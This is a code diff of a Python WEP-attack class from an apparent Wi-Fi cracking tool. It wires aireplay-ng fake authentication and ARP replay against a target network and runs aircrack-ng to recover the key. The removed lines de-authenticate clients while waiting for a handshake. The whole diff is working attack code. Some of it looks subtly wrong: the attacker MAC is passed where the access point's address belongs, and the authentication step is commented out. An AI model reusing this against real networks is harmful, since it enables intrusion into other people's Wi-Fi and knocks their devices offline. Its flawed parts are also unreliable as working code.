@@ -8,53 +8,60 @@
 """
 
 from wicc_enc_type import EncryptionType
-from time import sleep
+import time
+import threading
 
 
 class WEP(EncryptionType):
-    def __init__(self, network, interface):
-        EncryptionType.__init__(self, network, interface)
+    def __init__(self, network, interface, mac, verbose_level):
+        """
+        Constructor for the WEP class (also calls the parent constructor)
+        :param network: target network for the attack
+        :param interface: selected wireless interface
+        :param mac: attacker mac address
+        :param verbose_level: verbose level set by main
+
+        :Author: Miguel Yanes Fernández
+        """
+        EncryptionType.__init__(self, network, interface, verbose_level)
         # super().__init__(self, network, interface)
+        self.mac = mac
 
-    def scan_network(self):
-        temp_dump = '/tmp/WiCC/'
-        super().scan_network(temp_dump)
-        temp_dump += 'net_attack-01.cap'
-        valid_handshake = False
+    def scan_network(self, write_directory):
+        """
+        Method to scan the target network. With the selected attacker's mac, makes a fake authentication to the network
+        to then send arp responses to generate data.
+        :param write_directory: directory to write the scan files
+        :return: none
 
-        pyrit_cmd = ['pyrit', '-r', temp_dump, 'analyze']
-        de_auth_cmd = ['aireplay-ng', '-0', '1', '--ignore-negative-one', '-a', self.bssid, '-D', self.interface]
+        :Author: Miguel Yanes Fernández
+        """
+        super(WEP, self).scan_network(write_directory)
 
-        second_iterator = 0  # when 15, de-auth's clients on the network
-        while not valid_handshake:
-            pyrit_out, err = super().execute_command(pyrit_cmd)
-            valid_handshake = self.filter_pyrit_out(pyrit_out)
-            if not valid_handshake:
-                print("no valid handshake")
-                sleep(1)
-                second_iterator += 1
-                if second_iterator == 15:
-                    super().execute_command(de_auth_cmd)
-                    second_iterator = 0
-            else:
-                print("found valid handshake")
-                break
+        fakeauth_cmd = ['aireplay-ng', '--fakeauth', '0', '-a', self.mac, '-e', self.essid, '-T', '3', self.interface]
+        arpreplay_cmd = ['aireplay-ng', '--arpreplay', '-b', self.bssid, '-h', self.mac,
+                        '--ignore-negative-one', self.interface]
 
-    @staticmethod
-    def filter_pyrit_out(output):
-        output = output.decode('utf-8')
-        lines = output.split('\n')
-        for line in lines:
-            if line == 'No valid EAOPL-handshake + ESSID detected.':
-                return False
-            elif 'handshake(s)' in line:
-                print("handshake: " + line)
-                return True
-        return True  # THIS SHOULD BE False, it's true just for debugging purposes
+        #fakeauth_out, err = self.execute_command(fakeauth_cmd)
+        #print(fakeauth_out.decode('utf-8'))
+
+        arpreplay_thread = threading.Thread(target=self.execute_command, args=(arpreplay_cmd,))
+        arpreplay_thread.start()
+        arpreplay_thread.join(0)
+
+        self.show_message("running aireplay thread on mac: " + self.mac)
 
     def crack_network(self):
-        aircrack_cmd = ['aircrack-ng', '/tmp/WiCC/net_attack-01.cap.bak', '-b', self.bssid]
+        """
+        Crack the selected network. Aircrack is left running until if gets enough iv's to crack the connection key
+        :return: password key
+
+        :Author: Miguel Yanes Fernández
+        """
+        aircrack_cmd = ['aircrack-ng', '/tmp/WiCC/net_attack-01.cap']
+        self.show_message("will execute aircrack")
         crack_out, crack_err = super().execute_command(aircrack_cmd)
+        self.show_message("finished aircrack")
         # will need to filter the output from aircrack
-        password = crack_out.decode('utf-8')
+        password = self.filter_aircrack(crack_out.decode('utf-8'))
         return password
